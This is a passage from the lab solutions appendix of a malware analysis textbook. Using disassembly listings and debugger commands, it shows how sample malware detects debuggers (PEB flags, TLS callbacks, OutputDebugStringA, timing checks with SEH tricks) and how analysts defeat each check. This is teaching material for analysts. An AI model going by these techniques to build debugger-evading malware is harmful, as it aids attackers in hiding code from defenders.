  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 16-2L: Using the command line to dump*'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 16-3L: OllyDbg PhantOm*'
  prefs: []
  type: TYPE_NORMAL
- en: '*the BeingDebugged flag and then setting it to 0*'
  prefs: []
  type: TYPE_NORMAL
- en: '*plug-in options*'
  prefs: []
  type: TYPE_NORMAL
- en: '**The ProcessHeap Flag**'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 16-3L shows the code in the middle box of Figure 16-1L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401410 64 A1 30 00 00+ mov eax, large fs:30h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401416 8B 40 18 mov eax, [eax+18h] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401419 db 3Eh 
  prefs: []
  type: TYPE_NORMAL
- en: 00401419 3E 8B 40 10 mov eax, [eax+10h] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040141D 89 45 F0 mov [ebp+var_10], eax 00401420 83 7D F0 00 cmp [ebp+var_10],
    0 
  prefs: []
  type: TYPE_NORMAL
- en: 00401424 74 05 jz short loc_40142B
  prefs: []
  type: TYPE_NORMAL
- en: 00401426 E8 D5 FB FF FF call sub_401000
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-3L: Checking the ProcessHeap flag*'
  prefs: []
  type: TYPE_NORMAL
- en: '**658**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The PEB structure is loaded into EAX at  using fs:[30]. At , the ProcessHeap
    structure (offset 0x18 into the PEB) is moved into EAX, and then the ForceFlags
    field (offset 0x10 into the ProcessHeap structure) is moved into EAX at . ForceFlags
    is compared to 0 at  to decide whether to call sub_401000 or to continue running
    normally.
  prefs: []
  type: TYPE_NORMAL
- en: An erroneous db 3Eh instruction was added by IDA Pro at . We displayed the
    opcodes in Listing 16-2L to show that the 0x3E is included in the next instruction
    at . If you look at the disassembly in OllyDbg, you won’t see this error.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*When you encounter erroneous db instructions, you can ignore them, but you
    should* *display opcodes to confirm that the byte is disassembled properly in
    an instruction.*'
  prefs: []
  type: TYPE_NORMAL
- en: The 4-byte ForceFlags field is nonzero when the ProcessHeap structure is created
    in the debugger, and the ForceFlags field must be 0 in order for the malware to
    run normally within a debugger. We need to change it to 0 when debugging, either
    manually with the OllyDbg Command Line plug-in or by using the OllyDbg PhantOm
    plug-in, as with the BeingDebugged flag.
  prefs: []
  type: TYPE_NORMAL
- en: 'To set the ForceFlags field to 0 manually, launch the Command Line plug-in
    by selecting **Plugins****Command Line**, and then enter the following command
    in the window:'
  prefs: []
  type: TYPE_NORMAL
- en: dump ds:[fs:[30] + 0x18] + 0x10
  prefs: []
  type: TYPE_NORMAL
- en: The command dumps the ForceFlags field of the ProcessHeap structure into the
    dump window. Select all 4 bytes of the ForceFlags field, and then right-click
    and select **Binary****Fill With 00’s** to set the 4 bytes to 0\.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*In Windows 7, offset 0x10 is no longer the ForceFlags field, so this anti-debugging*
    *method may end up falsely indicating the presence of a debugger on newer versions
    of* *Windows (post-XP).*'
  prefs: []
  type: TYPE_NORMAL
- en: Alternatively, use the PhantOm plug-in to protect against the ProcessHeap anti-debugging
    technique. The PhantOm plug-in will cause this technique to fail when you start
    the program with debug heap creation disabled. (You **1 6**
  prefs: []
  type: TYPE_NORMAL
- en: don’t need to modify the settings as you did for the BeingDebugged flag.) **NOTE**
  prefs: []
  type: TYPE_NORMAL
- en: '*In WinDbg, you can start a program with the debug heap disabled by using the
    –hd* *option, which causes the ForceFlags field to always be 0\. For example,
    the command* *windbg –hd Lab16-01.exe creates heaps in normal mode, rather than
    in debug mode.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**The NTGlobalFlag Flag**'
  prefs: []
  type: TYPE_NORMAL
- en: The code in the lower box of Figure 16-1L is shown in Listing 16-4L.
  prefs: []
  type: TYPE_NORMAL
- en: 00403594 mov eax, large fs:30h 
  prefs: []
  type: TYPE_NORMAL
- en: 0040359A db 3Eh 
  prefs: []
  type: TYPE_NORMAL
- en: 0040359A mov eax, [eax+68h] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040359E sub eax, 70h
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**659**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004035A1 mov [ebp+var_1828], eax 004035A7 cmp [ebp+var_1828], 0
  prefs: []
  type: TYPE_NORMAL
- en: 004035AE jnz short loc_4035B5
  prefs: []
  type: TYPE_NORMAL
- en: 004035B0 call sub_401000
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-4L: Checking the NTGlobalFlag flag*'
  prefs: []
  type: TYPE_NORMAL
- en: The PEB structure is loaded into EAX at  using fs:[30], and NTGlobalFlag is
    accessed and moved into EAX at . NTGlobalFlag is compared to 0x70, and a decision
    is made whether to call sub_401000 (the terminate and remove function) or to continue
    executing normally. The erroneous db 3Eh added by IDA Pro is seen at , and we
    ignore it.
  prefs: []
  type: TYPE_NORMAL
- en: The NTGlobalFlag flag at offset 0x68 in the PEB structure is set to 0x70 when
    the process is run in a debugger. As with the other flags we’ve discussed, we
    need to set this byte to 0, either manually or by using an OllyDbg plug-in.
  prefs: []
  type: TYPE_NORMAL
- en: 'To set NTGlobalFlag manually, launch the Command Line plug-in by selecting
    **Plugins****Command Line**, and then enter the following command in the window:'
  prefs: []
  type: TYPE_NORMAL
- en: dump fs:[30] + 0x68
  prefs: []
  type: TYPE_NORMAL
- en: This dumps the NTGlobalFlag flag into the dump window. As with the BeingDebugged
    flag, select the byte, right-click, and select **Binary****Fill With** **00’s**
    to set the byte to 0\.
  prefs: []
  type: TYPE_NORMAL
- en: You can use also the OllyDbg plug-in PhantOm to protect yourself from the NTGlobalFlag
    anti-debugging technique without the need to modify any settings.
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: Lab 16-1 uses three different anti-debugging techniques to attempt to thwart
    debugger analysis. The malware manually checks structures for telltale signs of
    debugger usage and performs the same three checks at the start of nearly every
    subroutine, which makes flipping single jump flags tedious when inside a debugger.
    As you’ve seen, the easiest way to defeat the malware is to change the structures
    in memory so that the check fails, and you can make this change either manually
    or with the PhantOm plug-in for OllyDbg.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 16-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: When you run *Lab16-02.exe* from the command line, it prints a usage string
    asking for a four-character password.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: If you input an incorrect password, the program will respond “Incorrect password,
    Try again.”
  prefs: []
  type: TYPE_NORMAL
- en: '**660**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The correct command-line password is byrr.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The strncmp function is called at 0x40123A.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The program immediately terminates when loaded into OllyDbg using the default
    settings.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The program contains a .tls section.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The TLS callback starts at 0x401060\.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: The FindWindowA function is used to terminate the malware. It looks for a window
    with the class name OLLYDBG and terminates the program if it is found. You can
    change the window class name using an OllyDbg plug-in like PhantOm, or NOP-out
    the call to exit at 0x40107C.
  prefs: []
  type: TYPE_NORMAL
- en: 9\.
  prefs: []
  type: TYPE_NORMAL
- en: At first, the password appears to be bzqr when you set a breakpoint at the strncmp
    call.
  prefs: []
  type: TYPE_NORMAL
- en: 10\. This password found in the debugger doesn’t work on the command line.
  prefs: []
  type: TYPE_NORMAL
- en: 11\. The result of OutputDebugStringA and the BeingDebugged flag are used as
    inputs to the decoding algorithm. You can use the PhantOm plug-in to ensure that
    the BeingDebugged flag is 0, and you can NOP-out the add instruction at 0x401051\.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'We first run the program from the command line and see the following printed
    to the screen:'
  prefs: []
  type: TYPE_NORMAL
- en: 'usage: Lab16-02.exe <4 character password>'
  prefs: []
  type: TYPE_NORMAL
- en: 'The program is expecting a four-character password. Next, we attempt to provide
    the password abcd on the command line, and get the following output: Incorrect
    password, Try again.'
  prefs: []
  type: TYPE_NORMAL
- en: Now, we look for a string comparison in the code so we can run the program in
    a debugger and set a breakpoint at the string comparison in order to **1 6**
  prefs: []
  type: TYPE_NORMAL
- en: see the password. The fourth Lab 16-2 question hinted that strncmp is used.
  prefs: []
  type: TYPE_NORMAL
- en: If we load the program into IDA Pro, we see strncmp in the main function at
    0x40123A. Let’s load the program into OllyDbg and set a breakpoint at 0x40123A.
  prefs: []
  type: TYPE_NORMAL
- en: After we load *Lab16-02.exe* into OllyDbg, it immediately terminates without
    pausing the program. We suspect something is amiss, so we check the PE
  prefs: []
  type: TYPE_NORMAL
- en: file structure. Figure 16-4L shows the PE header section names in PEview.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**661**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 150](index-695_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 151](index-695_2.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 16-4L: PEview displaying a TLS section for Lab 16-2*'
  prefs: []
  type: TYPE_NORMAL
- en: The TLS section contains callback functions that gain execution and prematurely
    terminate the program in OllyDbg. In IDA Pro, press CTRL-E to see the location
    of all entry points for the program, as shown in Figure 16-5L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 16-5L: PEview displaying a TLS section for Lab 16-2*'
  prefs: []
  type: TYPE_NORMAL
- en: Double-click the TLS callback function at 0x401060 to navigate directly to the
    function and see if there is any anti-debugging functionality. Listing 16-5L
  prefs: []
  type: TYPE_NORMAL
- en: shows the TLS callback code.
  prefs: []
  type: TYPE_NORMAL
- en: 00401063 cmp [ebp+arg_4], 1
  prefs: []
  type: TYPE_NORMAL
- en: 00401067 jnz short loc_401081
  prefs: []
  type: TYPE_NORMAL
- en: 00401069 push 0 ; lpWindowName 0040106B push offset ClassName ; "OLLYDBG"
  prefs: []
  type: TYPE_NORMAL
- en: 00401070 call ds:FindWindowA 
  prefs: []
  type: TYPE_NORMAL
- en: 00401076 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401078 jz short loc_401081
  prefs: []
  type: TYPE_NORMAL
- en: 0040107A push 0 ; int
  prefs: []
  type: TYPE_NORMAL
- en: 0040107C call _exit 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-5L: FindWindowA check for system residue of OllyDbg* The TLS callback
    starts with a comparison of arg_4 to 1 to determine whether the TLS callback is
    being called as a result of the process starting up.'
  prefs: []
  type: TYPE_NORMAL
- en: (TLS callback functions are called at different times by the system.) In other
    words, this anti-debugging technique executes only during program startup.
  prefs: []
  type: TYPE_NORMAL
- en: At , the callback calls the FindWindowA function with the class name OLLYDBG.
    This call makes it easy for the malware to see if OllyDbg is running **662**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: with its default window name. If FindWindowA finds the window, it returns a
    nonzero value, which will cause the exit function to terminate the program at
    .
  prefs: []
  type: TYPE_NORMAL
- en: To disable this technique, NOP-out the call to exit at , or use the PhantOm
    plug-in for OllyDbg as discussed in the previous lab. (Figure 16-3L
  prefs: []
  type: TYPE_NORMAL
- en: displays the options for the PhantOm plug-in.) If you’re using the PhantOm plug-in,
    check the **Load Driver** and **Hide OllyDbg Windows** boxes to protect against
    this technique.
  prefs: []
  type: TYPE_NORMAL
- en: Now load the program into OllyDbg, set a breakpoint at the strncmp call at 0x40123A,
    and add a command-line argument of abcd in OllyDbg before clicking the play button.
    When you click play, the strncmp function appears to compare abcd to bzqrp@ss;
    however, strncmp checks only the first 4 bytes of the bzqrp@ss string. We conclude
    that the password must be bzqr, but if we try that password on the command line
    outside a debugger, we receive the incorrect password error message. We dig deeper
    into the code to determine if something else is going on.
  prefs: []
  type: TYPE_NORMAL
- en: We begin by properly labeling the encoded string in the listing. The second
    parameter passed on the stack to strncmp is byte_408030 (a global variable), which
    we know to be a byte array of size 4\. We change this into a 4-byte array and
    rename it encoded_password.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see CreateThread called just before the call to strncmp in the main
    function. To look at the code in the thread created by this call, double-click
    the parameter labeled StartAddress. This function appears to be a decoding routine
    since it contains many logical and shift operations on encoded_password.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the decoding routine closely, we see the BeingDebugged flag accessed,
    as shown in Listing 16-6L at  and .
  prefs: []
  type: TYPE_NORMAL
- en: 00401124 ror encoded_password+2, 7
  prefs: []
  type: TYPE_NORMAL
- en: 0040112B mov ebx, large fs:30h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401132 xor encoded_password+3, 0C5h
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040117D rol encoded_password, 6
  prefs: []
  type: TYPE_NORMAL
- en: 00401184 xor encoded_password, 72h
  prefs: []
  type: TYPE_NORMAL
- en: 0040118B mov bl, [ebx+2] 
  prefs: []
  type: TYPE_NORMAL
- en: '**1 6**'
  prefs: []
  type: TYPE_NORMAL
- en: 0040118E rol encoded_password+1, 1
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004011A2 add encoded_password+2, bl 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-6L: Decoding routine incorporating anti-debugging in its decoding*
    The PEB structure is loaded into EBX at , and then the BeingDebugged flag is
    moved into BL at . BL is then used at  to modify the password. The easiest way
    to prevent the program from using this technique is to ensure that the BeingDebugged
    flag is 0, which can be set either manually or with the PhantOm plug-in for OllyDbg,
    as discussed in the previous lab.'
  prefs: []
  type: TYPE_NORMAL
- en: We load the program into OllyDbg again and break at the strncmp call at 0x40123A.
    This time, the password appears to be bzrr. But when we try this password on the
    command line, we receive the incorrect password error message again.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**663**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Returning to the decoding routine, we see that it uses a global variable, byte_40A968,
    as shown in Listing 16-7L.
  prefs: []
  type: TYPE_NORMAL
- en: 0040109B mov bl, byte_40A968 
  prefs: []
  type: TYPE_NORMAL
- en: 004010A1 or al, 1
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040110A rol encoded_password, 2
  prefs: []
  type: TYPE_NORMAL
- en: 00401111 add encoded_password+1, bl 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-7L: Global byte_40A968 used in the password decoding* At , byte_40A968
    is moved into BL, and BL is used in the decoding code, as seen at . Double-clicking
    byte_40A968, we see that it is initialized to 0, but it has a cross-reference
    to sub_401020\. That function is shown in Listing 16-8L.'
  prefs: []
  type: TYPE_NORMAL
- en: 00401024 mov [ebp+dwErrCode], 3039h
  prefs: []
  type: TYPE_NORMAL
- en: 0040102B mov eax, [ebp+dwErrCode]
  prefs: []
  type: TYPE_NORMAL
- en: 0040102E push eax ; dwErrCode 0040102F call ds:SetLastError 
  prefs: []
  type: TYPE_NORMAL
- en: 00401035 push offset OutputString ; "b"
  prefs: []
  type: TYPE_NORMAL
- en: 0040103A call ds:OutputDebugStringA 
  prefs: []
  type: TYPE_NORMAL
- en: 00401040 call ds:GetLastError
  prefs: []
  type: TYPE_NORMAL
- en: 00401046 cmp eax, [ebp+dwErrCode] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401049 jnz short loc_40105A
  prefs: []
  type: TYPE_NORMAL
- en: 0040104B mov cl, byte_40A968
  prefs: []
  type: TYPE_NORMAL
- en: 00401051 add cl, 1 
  prefs: []
  type: TYPE_NORMAL
- en: 00401054 mov byte_40A968, cl
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-8L: OutputDebugStringA anti-debugging technique* At , OutputDebugStringA
    is called, which sends a string (in this case, "b") to a debugger for display.
    If there is no debugger attached, an error code is set. At , SetLastError sets
    the error code to 0x3039, and the function checks to see if that error is still
    present with the comparison at . The error code changes if the program is running
    outside a debugger; therefore, the comparison will set the zero flag if the error
    code has not changed (running in a debugger). If this check is successful, the
    code increments byte_40A968 by 1'
  prefs: []
  type: TYPE_NORMAL
- en: at . The easiest way to defeat this technique is to NOP-out the add instruction
    at .
  prefs: []
  type: TYPE_NORMAL
- en: Next, we want to track down how the function from Listing 16-8L
  prefs: []
  type: TYPE_NORMAL
- en: (sub_401020) is called. We check the cross-reference and see that sub_401020
  prefs: []
  type: TYPE_NORMAL
- en: is called from the TLS callback, as shown in Listing 16-9L (in bold).
  prefs: []
  type: TYPE_NORMAL
- en: 00401081 cmp [ebp+arg_4], 2
  prefs: []
  type: TYPE_NORMAL
- en: 00401085 jnz short loc_40108C
  prefs: []
  type: TYPE_NORMAL
- en: 00401087 call **sub_401020**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-9L: The check and call from within the TLS callback* **664**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The code in Listing 16-9L starts by comparing arg_4 to the number 2\.
  prefs: []
  type: TYPE_NORMAL
- en: 'Recall from our earlier discussion that arg_4 to the TLS callback is used to
    determine when the TLS callback is made: 1 is used for when the process is starting
    up, 2 for when a thread is starting up, and 3 when the process is being terminated.
    Therefore, this TLS callback was called again when the CreateThread executed and
    caused the OutputDebugStringA to execute.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Getting the Correct Password**'
  prefs: []
  type: TYPE_NORMAL
- en: To finally get the password, we start with our OllyDbg PhantOm plug-in installed
    and set up to protect us from the BeingDebugged flag check and the FindWindow
    check. We load the program into OllyDbg, NOP-out the add instruction at 0x401051,
    and set a breakpoint at the strncmp call (0x40123A).
  prefs: []
  type: TYPE_NORMAL
- en: 'This time, the password appears to be byrr. Trying this on the command line,
    we get the following message:'
  prefs: []
  type: TYPE_NORMAL
- en: You entered the correct password!
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 16-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: There aren’t many useful strings in the malware other than import functions
    and the strings cmd and cmd.exe.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: When you run this malware, it appears to do nothing other than terminate.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: You must rename the malware to *peo.exe* for it to run properly.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: 'This malware uses three different anti-debugging timing techniques: rdtsc,
    GetTickCount, and QueryPerformanceCounter.'
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: If the QueryPerformanceCounter check is successful, the malware modifies the
    string needed for the program to run properly. If the GetTickCount check is successful,
    the malware causes an unhandled exception that **1 6**
  prefs: []
  type: TYPE_NORMAL
- en: crashes the program. If the rdtsc check is successful, the malware will attempt
    to delete itself from disk.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The anti-debugging timing checks are successful because the malware causes and
    catches an exception that it handles by manipulating the Structured Exception
    Handling (SEH) mechanism to include its own exception handler in between two calls
    to the timing checking functions.
  prefs: []
  type: TYPE_NORMAL
- en: Exceptions are handled much more slowly in a debugger than outside a debugger.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware uses the domain name *adg.malwareanalysisbook.com*.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: As noted in the lab description, this malware is the same as *Lab09-02.exe*,
    except with added anti-debugging techniques. A good place to start is by Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**665**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: doing Lab 9-2 or by reviewing your answers to refresh your memory of this malware’s
    capabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Static analysis of *Lab16-03.exe* shows it to be similar to *Lab09-02.exe*,
    with few strings visible other than cmd.exe. When we load *Lab16-03.exe* into
    IDA Pro, we see that much of the same functionality is present in this malware.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 16-10L shows the malware using gethostbyname to resolve a domain and
    using port 9999, as with Lab 9-2\.
  prefs: []
  type: TYPE_NORMAL
- en: 004015DB call ds:gethostbyname
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040160D push 9999 ; hostshort 00401612 call ds:htons
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-10L: Same calls from Lab 9-2, which resolve a domain name and get
    a port in* *network byte order*'
  prefs: []
  type: TYPE_NORMAL
- en: Since this malware uses DNS and connects out over port 9999, we set up a dynamic
    environment using ApateDNS and Netcat. However, when we first run the malware,
    it doesn’t perform DNS or connect on port 9999\. Recall from Lab 9-2 that the
    name of the malware needed to be *ocl.exe*. Let’s see if that is the case here.
  prefs: []
  type: TYPE_NORMAL
- en: 'Two strings appear to be created on the stack at the start of the malware’s
    main function: 1qbz2wsx3edc and ocl.exe. We rename the malware to *ocl.exe* to
    see if it connects out. It doesn’t, which means the name *ocl.exe* must be modified
    before the comparison.'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 16-11L shows the string comparison that checks to see if the launched
    malware has the correct name.
  prefs: []
  type: TYPE_NORMAL
- en: 0040150A mov ecx, [ebp+Str2] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401510 push ecx ; Str2
  prefs: []
  type: TYPE_NORMAL
- en: 00401511 lea edx, [ebp+Str1] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401517 push edx ; Str1
  prefs: []
  type: TYPE_NORMAL
- en: 00401518 call _strncmp
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-11L: Using strncmp for the module name comparison* At , we see
    Str2, which will contain the current name of the launched malware. At , we see
    Str1\. Looking back through the code, it seems Str1 is our ocl.exe string, but
    it is passed to sub_4011E0 before the comparison. Let’s load this malware into
    OllyDbg and set a breakpoint at the strncmp call at 0x401518\.'
  prefs: []
  type: TYPE_NORMAL
- en: When we set the breakpoint and click play, we get a division-by-zero exception
    caught by OllyDbg. You can press SHIFT-F9 to pass the exception to the program
    or change the options to pass all exceptions to the program.
  prefs: []
  type: TYPE_NORMAL
- en: After we pass the exception to the program, it is handled, and we arrive at
    the 0x401518 breakpoint. We see that qgr.exe is on the stack to be compared to
    Lab16-03.exe, so we try to rename the malware to *qgr.exe*. However, when we try
    to run it with the name *qgr.exe*, the malware still doesn’t perform a DNS query
    or connect out.
  prefs: []
  type: TYPE_NORMAL
- en: '**666**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**The QueryPerformanceCounter Function** We need to review the sub_4011E0 function
    (where the ocl.exe string was passed) before the strncmp function. Examining sub_4011E0,
    we see that it calls QueryPerformanceCounter twice, as shown in Listing 16-12L
    (in bold).'
  prefs: []
  type: TYPE_NORMAL
- en: 00401219 lea eax, [ebp+PerformanceCount]
  prefs: []
  type: TYPE_NORMAL
- en: 0040121C push eax ; lpPerformanceCount 0040121D call ds:**QueryPerformanceCounter**
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040126A lea ecx, [ebp+var_110]
  prefs: []
  type: TYPE_NORMAL
- en: 00401270 push ecx ; lpPerformanceCount 00401271 call ds:**QueryPerformanceCounter**
  prefs: []
  type: TYPE_NORMAL
- en: 00401277 mov edx, [ebp+var_110]
  prefs: []
  type: TYPE_NORMAL
- en: 0040127D sub edx, dword ptr [ebp+PerformanceCount] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401280 mov [ebp+var_114], edx
  prefs: []
  type: TYPE_NORMAL
- en: 00401286 cmp [ebp+var_114], 4B0h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401290 jle short loc_40129C
  prefs: []
  type: TYPE_NORMAL
- en: 00401292 mov [ebp+var_118], 2 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-12L: Anti-debugging timing check using QueryPerformanceCounter*
    The two calls to QueryPerformanceCounter surround code that we will examine shortly,
    but for now we’ll look at the rest of the function. The malware subtracts the
    first-time capture (lpPerformanceCount) from the second-time capture (var_110)
    at . Next, at , the malware compares the result of the time difference to 0x4B0
    (1200 in decimal). If the time difference exceeds 1200, var_118 is set to 2; otherwise,
    it will stay at 1 (its initialized value).'
  prefs: []
  type: TYPE_NORMAL
- en: Immediately following this check is the start of a for loop at 0x40129C.
  prefs: []
  type: TYPE_NORMAL
- en: The loop (not shown here) manipulates the string passed into the function (arg_0)
    using var_118; therefore, the QueryPerformanceCounter check influences the string
    result. The string used in strncmp is different in a debugger versus when run
    normally. To get the correct string, we’ll make sure that var_118
  prefs: []
  type: TYPE_NORMAL
- en: is set to 1 when this loop is entered. To do this, we set a breakpoint at the
    strncmp and NOP-out the instruction at . Now we see that the filename must be
    *peo.exe* in order for the malware to run properly outside a debugger.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 6**'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s examine the code surrounded by the two calls to QueryPerformanceCounter.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 16-13L shows the code that starts with a call/pop combination to get
    the current EIP into the EAX register.
  prefs: []
  type: TYPE_NORMAL
- en: 00401223 call $+5
  prefs: []
  type: TYPE_NORMAL
- en: 00401228 pop eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401229 xor ecx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040122B mov edi, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040122D xor ebx, ebx
  prefs: []
  type: TYPE_NORMAL
- en: 0040122F add ebx, 2Ch 
  prefs: []
  type: TYPE_NORMAL
- en: 00401232 add eax, ebx
  prefs: []
  type: TYPE_NORMAL
- en: 00401234 push eax 
  prefs: []
  type: TYPE_NORMAL
- en: 00401235 push large dword ptr fs:0
  prefs: []
  type: TYPE_NORMAL
- en: 0040123C mov large fs:0, esp 
  prefs: []
  type: TYPE_NORMAL
- en: 00401243 div ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401245 sub edi, 0D6Ah
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**667**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040124B mov ecx, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 00401250 jmp short loc_401262
  prefs: []
  type: TYPE_NORMAL
- en: 00401252 repne stosb
  prefs: []
  type: TYPE_NORMAL
- en: 00401254 mov ecx, [esp+0Ch] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401258 add dword ptr [ecx+0B8h], 2
  prefs: []
  type: TYPE_NORMAL
- en: 0040125F xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401261 retn
  prefs: []
  type: TYPE_NORMAL
- en: 00401262 pop large dword ptr fs:0 
  prefs: []
  type: TYPE_NORMAL
- en: 00401269 pop eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-13L: Malware setting its own exception handler and triggering an
    exception* Once the malware gets the current EIP into EAX it adds 0x2C to it at
    .'
  prefs: []
  type: TYPE_NORMAL
- en: This causes the EAX register to contain 0x2C + 0x401228 = 0x401254, which references
    the code starting at . Next, the malware modifies SEH to insert the 0x401254
